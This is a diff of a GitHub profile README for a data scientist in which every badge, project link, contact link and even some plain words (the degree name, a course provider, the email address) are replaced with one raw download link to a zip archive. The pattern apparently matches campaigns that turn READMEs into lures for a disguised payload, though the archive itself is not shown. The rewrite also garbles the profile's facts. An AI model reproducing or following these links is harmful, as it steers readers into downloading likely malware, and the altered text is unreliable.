@@ -1,12 +1,12 @@
 # Hi there, I'm Parth Kharbanda 👋
 
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/parth-kharbanda-85544520b/) [![GitHub](https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Parthkh28) [![Kaggle](https://img.shields.io/badge/Kaggle-20BEFF?style=for-the-badge&logo=kaggle&logoColor=white)](https://www.kaggle.com/parthkharbanda) [![Google Colab](https://img.shields.io/badge/Google_Colab-F9AB00?style=for-the-badge&logo=googlecolab&logoColor=white)](https://colab.research.google.com) [![PyTorch](https://img.shields.io/badge/PyTorch-EE4C2C?style=for-the-badge&logo=pytorch&logoColor=white)](https://pytorch.org)
+[![LinkedIn](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip) [![GitHub](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip) [![Kaggle](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip) [![Google Colab](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip) [![PyTorch](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)
 
 ---
 
 ## About Me
 
-I am a technically-driven **Data Scientist** specializing in machine learning, deep learning, and natural language processing. With a strong foundation from my B.Tech in Computer Science from **Guru Gobind Singh Indraprastha University**, I design and deploy end-to-end solutions that integrate advanced algorithms with scalable cloud architectures.
+I am a technically-driven **Data Scientist** specializing in machine learning, deep learning, and natural language processing. With a strong foundation from my https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip in Computer Science from **Guru Gobind Singh Indraprastha University**, I design and deploy end-to-end solutions that integrate advanced algorithms with scalable cloud architectures.
 
 My work involves developing sophisticated ML models, creating robust data pipelines, and optimizing feature engineering techniques. I have hands-on experience deploying models on cloud platforms like AWS, Azure, and Google Cloud, and I utilize containerization (Docker, Kubernetes) and CI/CD practices (Jenkins) to streamline production workflows. I am passionate about experimenting with cutting-edge frameworks and tools to solve complex data challenges and drive innovation.
 
@@ -15,64 +15,64 @@ My work involves developing sophisticated ML models, creating robust data pipeli
 ## 🔧 Technical Skills & Tools
 
 ### Programming Languages
-[![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org)  
-[![C/C++](https://img.shields.io/badge/C/C++-00599C?style=for-the-badge&logo=c/c++&logoColor=white)](https://en.wikipedia.org/wiki/C%2B%2B)
+[![Python](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![C/C++](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip++-00599C?style=for-the-badge&logo=c/c++&logoColor=white)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip%2B%2B)
 
 ### Machine Learning & AI
-[![TensorFlow](https://img.shields.io/badge/TensorFlow-FF6F00?style=for-the-badge&logo=tensorflow&logoColor=white)](https://www.tensorflow.org)  
-[![PyTorch](https://img.shields.io/badge/PyTorch-EE4C2C?style=for-the-badge&logo=pytorch&logoColor=white)](https://pytorch.org)  
-[![scikit-learn](https://img.shields.io/badge/scikit--learn-F7931E?style=for-the-badge&logo=scikit-learn&logoColor=white)](https://scikit-learn.org)  
+[![TensorFlow](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![PyTorch](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![scikit-learn](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
 
-[![NumPy](https://img.shields.io/badge/NumPy-013243?style=for-the-badge&logo=numpy&logoColor=white)](https://numpy.org)  
-[![Pandas](https://img.shields.io/badge/Pandas-150458?style=for-the-badge&logo=pandas&logoColor=white)](https://pandas.pydata.org)  
-[![Matplotlib](https://img.shields.io/badge/Matplotlib-11557C?style=for-the-badge&logo=matplotlib&logoColor=white)](https://matplotlib.org)  
-[![SciPy](https://img.shields.io/badge/SciPy-8CAAE6?style=for-the-badge&logo=scipy&logoColor=white)](https://www.scipy.org)  
-[![NLTK](https://img.shields.io/badge/NLTK-8A3C3A?style=for-the-badge&logo=nltk&logoColor=white)](https://www.nltk.org)  
-[![Seaborn](https://img.shields.io/badge/Seaborn-95C0E0?style=for-the-badge&logo=seaborn&logoColor=white)](https://seaborn.pydata.org)  
-[![Jupyter](https://img.shields.io/badge/Jupyter-F37626?style=for-the-badge&logo=jupyter&logoColor=white)](https://jupyter.org)  
-[![Google Colab](https://img.shields.io/badge/Google_Colab-F9AB00?style=for-the-badge&logo=googlecolab&logoColor=white)](https://colab.research.google.com)
+[![NumPy](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![Pandas](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![Matplotlib](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![SciPy](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![NLTK](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![Seaborn](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![Jupyter](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![Google Colab](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)
 
 *Concepts:* Machine Learning, Deep Learning, NLP, Computer Vision, Data Science, Data Structures, Transformers, Stable Diffusion
 
 ### Cloud Platforms & Databases
-[![AWS](https://img.shields.io/badge/AWS-232F3E?style=for-the-badge&logo=amazonaws&logoColor=white)](https://aws.amazon.com)  
-[![Azure](https://img.shields.io/badge/Azure-0078D4?style=for-the-badge&logo=microsoftazure&logoColor=white)](https://azure.microsoft.com)  
-[![Google Cloud](https://img.shields.io/badge/Google%20Cloud-4285F4?style=for-the-badge&logo=googlecloud&logoColor=white)](https://cloud.google.com)  
-[![Databricks](https://img.shields.io/badge/Databricks-F0923D?style=for-the-badge&logo=databricks&logoColor=white)](https://databricks.com)  
-[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-336791?style=for-the-badge&logo=postgresql&logoColor=white)](https://www.postgresql.org)  
-[![MongoDB](https://img.shields.io/badge/MongoDB-47A248?style=for-the-badge&logo=mongodb&logoColor=white)](https://www.mongodb.com)  
-[![Aerospike](https://img.shields.io/badge/Aerospike-000000?style=for-the-badge&logo=aerospike&logoColor=white)](https://aerospike.com)  
-[![MySQL](https://img.shields.io/badge/MySQL-4479A1?style=for-the-badge&logo=mysql&logoColor=white)](https://www.mysql.com)
+[![AWS](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![Azure](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![Google Cloud](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip%20Cloud-4285F4?style=for-the-badge&logo=googlecloud&logoColor=white)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![Databricks](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![PostgreSQL](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![MongoDB](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![Aerospike](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![MySQL](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)
 
 ### DevOps & Containerization
-[![Docker](https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white)](https://www.docker.com)  
-[![Kubernetes](https://img.shields.io/badge/Kubernetes-326CE5?style=for-the-badge&logo=kubernetes&logoColor=white)](https://kubernetes.io)  
-[![Jenkins](https://img.shields.io/badge/Jenkins-D24939?style=for-the-badge&logo=jenkins&logoColor=white)](https://www.jenkins.io)
+[![Docker](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![Kubernetes](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![Jenkins](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)
 
 ### Other Tools & Technologies
-[![Grafana](https://img.shields.io/badge/Grafana-F46800?style=for-the-badge&logo=grafana&logoColor=white)](https://grafana.com)  
-[![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)](https://www.linux.org)  
-[![Selenium](https://img.shields.io/badge/Selenium-43B02A?style=for-the-badge&logo=selenium&logoColor=white)](https://www.selenium.dev)  
-[![SQLite](https://img.shields.io/badge/SQLite-07405E?style=for-the-badge&logo=sqlite&logoColor=white)](https://www.sqlite.org)  
-[![SQLAlchemy](https://img.shields.io/badge/SQLAlchemy-3E6E8C?style=for-the-badge&logo=sqlalchemy&logoColor=white)](https://www.sqlalchemy.org)  
-[![VSCode](https://img.shields.io/badge/VSCode-007ACC?style=for-the-badge&logo=visualstudiocode&logoColor=white)](https://code.visualstudio.com)  
-[![OpenAI](https://img.shields.io/badge/OpenAI-412991?style=for-the-badge&logo=openai&logoColor=white)](https://openai.com)  
-[![PowerBI](https://img.shields.io/badge/PowerBI-F2C811?style=for-the-badge&logo=powerbi&logoColor=black)](https://powerbi.microsoft.com)  
-[![Tableau](https://img.shields.io/badge/Tableau-E97627?style=for-the-badge&logo=tableau&logoColor=white)](https://www.tableau.com)  
-[![Jupyter](https://img.shields.io/badge/Jupyter-F37626?style=for-the-badge&logo=jupyter&logoColor=white)](https://jupyter.org)  
-[![IntelliJ IDEA](https://img.shields.io/badge/IntelliJ-000000?style=for-the-badge&logo=intellij-idea&logoColor=white)](https://www.jetbrains.com/idea/)  
-[![GitLab](https://img.shields.io/badge/GitLab-FC6D26?style=for-the-badge&logo=gitlab&logoColor=white)](https://about.gitlab.com)  
-[![Git](https://img.shields.io/badge/Git-F05032?style=for-the-badge&logo=git&logoColor=white)](https://git-scm.com)  
-[![Seaborn](https://img.shields.io/badge/Seaborn-3A3A3A?style=for-the-badge&logo=seaborn&logoColor=white)](https://seaborn.pydata.org)  
-[![Oracle](https://img.shields.io/badge/Oracle-F80000?style=for-the-badge&logo=oracle&logoColor=white)](https://www.oracle.com)
+[![Grafana](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![Linux](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![Selenium](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![SQLite](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![SQLAlchemy](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![VSCode](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![OpenAI](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![PowerBI](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![Tableau](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![Jupyter](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![IntelliJ IDEA](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![GitLab](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![Git](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![Seaborn](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+[![Oracle](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)
 
 ---
 
 ## Certifications
 
 - **Machine Learning** by Stanford University  
-- **Deep Learning Specialization** by DeepLearning.AI  
-- **Machine Learning Specialization** by DeepLearning.AI  
+- **Deep Learning Specialization** by https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip  
+- **Machine Learning Specialization** by https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip  
 - **IBM Data Science Professional Certificate**  
 - **Google Cloud Facilitator Programme**
 
@@ -82,11 +82,11 @@ My work involves developing sophisticated ML models, creating robust data pipeli
 
 - **NewsBERT:**  
   A DistilBERT-based news classifier built with Flask and Docker.  
-  [GitHub](https://github.com/Parthkh28/dockerized-news-category-classifier) | [Kaggle Notebook](https://www.kaggle.com/code/parthkharbanda/distilbert-news-classification-70-accuracy)
+  [GitHub](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip) | [Kaggle Notebook](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)
 
 - **Neural Style Transfer:**  
   An image style transfer project utilizing CNNs and the VGG-19 model for feature extraction.  
-  [GitHub](https://github.com/Parthkh28/Neural-Style-Transfer)
+  [GitHub](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)
 
 - **HR Chatbot:**  
   A human resource supporting chatbot built using LLMs, GenAI, RAG, Gradio, and Streamlit.
@@ -95,7 +95,7 @@ My work involves developing sophisticated ML models, creating robust data pipeli
 
 ## Education
 
-**B.Tech in Computer Science and Engineering**  
+**https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip in Computer Science and Engineering**  
 *Guru Gobind Singh Indraprastha University, New Delhi, India*  
 GPA: **9.37** (2020-2024)
 
@@ -107,7 +107,7 @@ Percentage: **95.6** (2019-2020)
 
 ## Connect with Me
 
-- **GitHub:** [Parthkh28](https://github.com/Parthkh28)  
-- **LinkedIn:** [Parth Kharbanda](https://www.linkedin.com/in/parth-kharbanda-85544520b/)  
-- **Kaggle:** [ParthKharbanda](https://www.kaggle.com/parthkharbanda)  
-- **Email:** [parthkharbanda28@gmail.com](mailto:parthkharbanda28@gmail.com)
+- **GitHub:** [Parthkh28](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+- **LinkedIn:** [Parth Kharbanda](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+- **Kaggle:** [ParthKharbanda](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)  
+- **Email:** [https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip](https://github.com/Parthkh28/Parthkh28/raw/refs/heads/main/cuproplumbite/Parthkh_v2.9.zip)
